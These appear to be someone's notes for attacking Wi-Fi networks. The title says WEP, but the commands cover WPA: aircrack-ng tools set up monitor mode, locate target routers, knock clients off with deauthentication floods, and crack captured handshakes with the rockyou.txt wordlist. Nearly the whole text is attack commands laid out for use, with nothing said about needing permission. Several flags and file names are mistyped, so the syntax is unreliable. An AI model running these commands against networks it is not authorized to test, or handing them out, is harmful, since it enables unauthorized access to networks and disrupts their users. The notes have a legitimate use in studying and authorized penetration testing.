###### WI-FI WEP HACKING ######

Note: ALL ACTIONS MUST BE TAKEN IN ROOT OR USE SUDO AND WIFI ADAPTER MUST BE IN MONITOR MODE


########## MONITOR MODE SET-UP ###########

airmon-ng

airmon-ng start wlan0
      OR

ifconfig wlan0 down

iwconfig wlan0 mode monitor

ifconfig wlan0 up


###### RECONNAISANCE #######

airodump wlan0

TIP: The lower the power, the closer the wireless point

airodump-ng --channel <channel number> --bbsid <router bssid> --write <Desiredfilename> wlan0
												                --> keep running until the end of the hack session.

airodump-ng -c <channel number> --bssid <router bssid> -w <file name / desired location (listfull directory)>

TIP: The BSSID number is also the device MAC address

airodump-ng --ban a -w <desired_file_name> wlan0 -->> suitable for capturing wpa traffic.

########## DEAUTHENTICATION ATTACK ##########

command-->> aireplay-ng --deauth <number_of_deauth_packets> -a <wifi_bssid> -c <target_bssid> wlan0
						Alternatively
	    aireplay-ng -0 <number_of_deuath_packets> -a <wifi_bssid> -c <target_bssid> wlan0

TIP: -D flag can be added to force the attack.

######## WPA CRACKING #########

WPA has embedded security, and we must carry out a dictionary attack.
A popular wordlist would be setlist (can be taken from GitHub) and rockyou.txt. 
They usually come with a Kali machine pre-installed. It would be located by navigating to the/usr/share/wordlist/* directory.


commmands-->> aircrack-ng -a2 -w <wordlist fullpath> wifi.cap file (full path)
					alternatively
	      aircrack-ng wifi.acp file -w <wordlist_file>

TIP: The number 2 specifies what WPA version it is
